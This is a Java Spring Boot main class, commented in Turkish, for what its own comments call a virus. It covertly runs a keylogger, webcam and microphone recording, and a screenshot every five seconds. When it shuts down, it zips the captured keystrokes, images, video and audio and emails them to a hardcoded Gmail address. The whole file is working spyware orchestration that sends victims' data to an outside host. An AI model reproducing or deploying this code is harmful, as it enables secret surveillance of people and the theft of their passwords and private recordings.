package com.isee.elfi;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import static com.isee.elfi.EmailSender.sendEmailWithInMemoryAttachment;

// Ana Uygulamamız
@SpringBootApplication
public class ElfiApplication {
    public static void main(String[] args) {
        // AWT Headless modunu devre dışı bırakıyoruz
        // Uygulamanın Gizli bir şekilde arkaplanda çalışması için GUI'yi kapattık
        System.setProperty("java.awt.headless", "false");

        // Uygulamamızı çalıştırıyoruz
        SpringApplication.run(ElfiApplication.class, args);

        // Oluşturduğumuz KeyLogger ve Voice Capture sınıflarından birer nesne üretiyoruz
        KeyLogger keyLogger = new KeyLogger();
        VoiceCapture recorder = new VoiceCapture();

        // Keylogger'ı yeni bir thread'de başlatıyoruz
        new Thread(keyLogger::startKeyLogger).start();

        // Video Kaydını yeni bir thread'de başlatıyoruz
        new Thread(CameraCapture::capture).start();

        // ScheduledExecutorService kullanarak her 5 saniyede bir ekran görüntüsü alıyoruz

        // 2 thread'a sahip zamanlanmış görev yürütücü havuzu oluşturduk
        // havuzumuzun boyutunu 2 yaptık çünkü beklenmedik bir şekilde işlem uzun sürerse diğer başlayacak görev için boş bir thread olması için
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(2);

        // Her 5 saniyede bir çalışacak olan görevimizi (captureScreen) - Ekran fotoğrafının çekilmesi işlemi
        // ilk başta bekleme süresi olarak 0 yazdık
        // periodumuz olan 5 i ve bu periodun saniye türünden olduğunu yazdık
        executor.scheduleAtFixedRate(ScreenCapture::captureScreen, 0, 5, TimeUnit.SECONDS);

        // Ses Kaydını başlatma işlemi
        recorder.startRecording();

        // Uygulamanın Kapandığının tespit edilmesi ve gerekli işlemlerin yapılması
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("Application is closing...");

            // ses kayıt işlemini durduruyoruz
            recorder.stopRecording();

            // Kaydettiğimiz tüm bilgileri mail yoluyla atma işlemi için gerekli olan mail kısımları

            // mailin gönderileceği adres
            String toEmail = "ozgurcoderr@gmail.com";
            // mail başlığı
            String subject = "ISEE.ELFI DENEME";
            // mail içeriğindeki yazı
            String bodyText = "This email contains a ZIP file attachment.";

            try {
                // String, byte[] türünden bir Map oluşturduk
                // bu mapı oluşturmamızın sebebi bu map içindeki objelerin tümünü bir zip dosyasına dönüştürmemizdir.
                Map<String, byte[]> fileContents = new LinkedHashMap<>();

                // ScreenCapture classımızdan şuana kadar çektiğimiz tüm ekran fotoğraflarını alıyoruz -  byte[] listesi şeklinde
                List<byte[]> imageList = ScreenCapture.getImageList();

                // her bir fotoğrafı isimlendirip byte[] halini map'imizin içine ekliyoruz
                for (int index = 0; index < imageList.size(); index++) {
                    fileContents.put("image_" + (index + 1) + ".png", imageList.get(index));
                }

                // Şuana kadar kullanıcnın bastığı tüm tuşların bilgisini byte[] formatında KeyLogger classından alıyoruz
                byte[] logBytes = KeyLogger.savedBytes;
                // Eğer herhangi bir log tutulmuşsa ( yani kullanıcı herhangi bir tuşa en az 1 kez basmışsa )
                if (logBytes != null) {
                    // keylogger.txt isminde byte[] formatında map'imizin içine ekliyoruz
                    fileContents.put("keylogger.txt", logBytes);
                }

                // Video Kaydedilmesini durduruyoruz
                CameraCapture.close();
                // Şuana kadar kaydedilen Kamera Kaydını CameraCapture classımızdan çekiyoruz
                byte[] videoByte = CameraCapture.videoByte;
                // eğer başarılı bir şekilde video kaydı kaydedilmişse video.flv isminde byte[] formatında map'imizin içine ekliyoruz
                if (videoByte != null) {
                    fileContents.put("video.flv", videoByte);
                }

                // şuana kadar kaydedilen ses kaydını byte[] formatında recorder ( VoiceCapture ) nesnemizden alıyoruz
                byte[] audioBytes = recorder.getAudioBytes();
                // eğer başarıyla ses kaydı yapılmışsa output.wav isminde byte[] formatında map'imizin içine ekliyoruz
                if (audioBytes != null) {
                    fileContents.put("output.wav", audioBytes);
                }

                // Zip oluşturma işlemi için yaptığımız Zipper classımızdan bir adet nesne üretiyoruz (zipper)
                Zipper zipper = new Zipper();
                // fileContents isimli map'imizi zipper.zipFiles isimli fonksiyona parametre olarak gönderip bu fonksiyondan
                // byte[] şeklinde dönen dosyalarımızın bir bütün halinde ziplenmiş halini alıyoruz
                byte[] zipData = zipper.zipFiles(fileContents);

                // daha sonrasında EmailSender classımızda bulunan sendEmailWithInMemoryAttachment fonksiyonu sayesinde
                // üst tarafta belirtilen mail bilgileri ve kaydedilen verilen bulunduğu zip dosyasımızın byte[] ını göndererek
                // mail gönderimi yapmış oluyoruz
                sendEmailWithInMemoryAttachment(toEmail, subject, bodyText, zipData, "file.zip");
            } catch (IOException e) {
                System.err.println("Error while creating the ZIP file: " + e.getMessage());
            }
        }));

        // şuanlık olarak virüs başlatıldıktan 30 saniye sonra kendini otomatik bir şekilde kapatıyor

        // 30 saniye sonra uygulamayı durdurmak için zamanlayıcı
        executor.schedule(() -> {
            System.out.println("30 seconds elapsed. Shutting down application...");
            // uygulamamızdan çıkma kodu
            System.exit(0);
        }, 30, TimeUnit.SECONDS);
    }
}
